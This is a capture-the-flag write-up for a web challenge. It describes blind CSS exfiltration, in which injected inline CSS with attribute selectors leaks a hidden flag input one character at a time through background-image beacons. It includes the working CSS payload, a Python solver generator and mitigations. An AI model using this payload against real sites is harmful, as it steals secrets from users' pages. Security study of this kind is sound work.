# Approve Please, Genie! — Web (500 pts)

**Flag:** `PTITCTF{youtu.be/XKZIQlqVjjk?si=n3v3r_th0ught_css_c0uld_b_that_dang3r0us_ab8d8535d15b}`

> *"never thought css could be that dangerous"* — and the `youtu.be/…` link is the vocaloid song the prompt teased ("a vocaloid song WITHOUT a depressing meaning… a very rare find").

## TL;DR
Note-sharing app (Express). The flag sits in a **hidden input** that only the **admin bot** can see. CSP blocks JavaScript but allows **inline CSS**. Inject CSS that uses an **attribute selector** as a string-comparison oracle plus `background:url()` as an out-of-band channel → **blind CSS exfiltration**, one flag character per admin visit.

## Recon
- Stack: `X-Powered-By: Express`, body-parser (Node/Express).
- **CSP on the note page:**
  ```
  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src * data:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
  ```
  → inline `<script>` blocked; **inline `<style>` fully allowed**; `img-src *` (any URL for backgrounds).
- Endpoints:
  - `POST /note`  body `content=<html>` → `{"id","leakToken","viewUrl":"/note/<id>","collectUrl":"/collect?t=<t>","leaksUrl":"/leaks/<t>"}`
  - `GET /note/<id>` →
    ```html
    <input type="hidden" id="flag-holder" value="REDACTED_ONLY_ADMIN_CAN_SEE_THIS">
    <h1>Lá sớ của dân</h1>
    <div id="note-content"> …your sanitized html… </div>
    ```
    For **us** the value is redacted; for the **admin bot** it is the real flag.
  - `POST /report` body `id=<uuid>` → admin bot opens the note → `{"status":"admin visited the note"}`.
  - `GET /collect?t=<tok>&q=<data>` → logs the request, returns a 1×1 GIF.
  - `GET /leaks/<tok>` → JSON list of collected queries (`[{"query":{"t","q"},"ip","ts"}]`).

## Sanitizer
Strips `<script>`, `<svg onload>`, `on*` handlers, `javascript:` hrefs, `<iframe>/<meta>/<base>/<form>/<link>`.
**Keeps `<style>…</style>` and inline `style=""` untouched.** → CSS is the vector.

## Vulnerability — Blind CSS Exfiltration (CSS injection)
Two CSS features abused together:
1. **Attribute selector `[value^="…"]`** = string matcher that reads attribute values, *including hidden inputs*:
   `#flag-holder[value^="PTITCTF{a"]` matches only if the flag starts with `PTITCTF{a`.
2. **`background:url(/collect?...)`** = out-of-band beacon: a *visible* element with a matching rule makes the browser fetch that URL.

`#flag-holder` is a **hidden** input (won't fetch a background) and a **preceding sibling** of the visible
`#note-content` (both children of `<body>`), so the general-sibling combinator `~` bridges them:

```css
#flag-holder[value^="PTITCTF{a"] ~ #note-content { background: url(/collect?t=TOK&q=61) }
```
→ *"if the flag starts with `PTITCTF{a`, fetch /collect?q=61 (='a')."* Only the one correct prefix matches,
so exactly one beacon fires per admin visit → one leaked character.

## Exploit (character-by-character oracle)
For each position, one note batches a rule for **every candidate char** (each with a distinct `q`);
`POST /report` makes the admin bot render it with the **real** flag; read `/leaks` to see which char fired.

```python
def batched_note(tok, known):
    rules = ["#note-content{display:block;width:40px;height:40px}"]
    for c in CHARSET:                       # url-aware: [A-Za-z0-9] + _-./}:?=&…
        kv = (known + c).replace('"','\\"')
        rules.append(f'#flag-holder[value^="{kv}"]~#note-content'
                     f'{{background:url(/collect?t={tok}&q={ord(c):02x})}}')
    return "<style>" + "".join(rules) + "</style>"
# loop: make_note -> report (retry until "admin visited") -> poll /leaks -> append char
```
Full solver: [`solve/solve_fast.py`](../solve/solve_fast.py). Progress persisted to `solve/progress.txt`.

## Operational notes (what actually mattered)
- **The admin bot is a single headless browser that survives only ~2–3 note loads per instance, then
  crashes** and returns `{"error":"admin bot failed to load the note"}` forever. Earlier attempts failed
  purely because of this (and an expired instance), *not* the technique.
  → Fix: **light notes** (small charset = fewer CSS rules), **fail fast** (don't hammer a dead bot),
  and **resume across instance respawns** via `progress.txt`.
- Only **one client** may touch the instance at a time (other agents eat the scarce bot loads).
- **Read the plaintext and skip ahead**: the `si=` value is readable leetspeak English
  (`n3v3r_th0ught_css_c0uld_b_that_dang3r0us`), so once a word was obvious we edited `progress.txt`
  forward and let the oracle only *verify* — saving many bot loads.
- Use **one combined URL-aware charset** (the flag is a `youtu.be/<id>?si=…` link), not a
  light-then-extended two-phase set — the two-phase approach wastes a whole bot load on every special char.

## Root cause / fix
Untrusted HTML rendered into a page that also contains the secret, with a CSP that permits
`style-src 'unsafe-inline'`. Mitigations: drop `<style>`/`style=` in the sanitizer, remove
`'unsafe-inline'` from `style-src`, don't place secrets in the DOM the victim renders, and don't let
attacker-controlled markup share a document with `#flag-holder`.
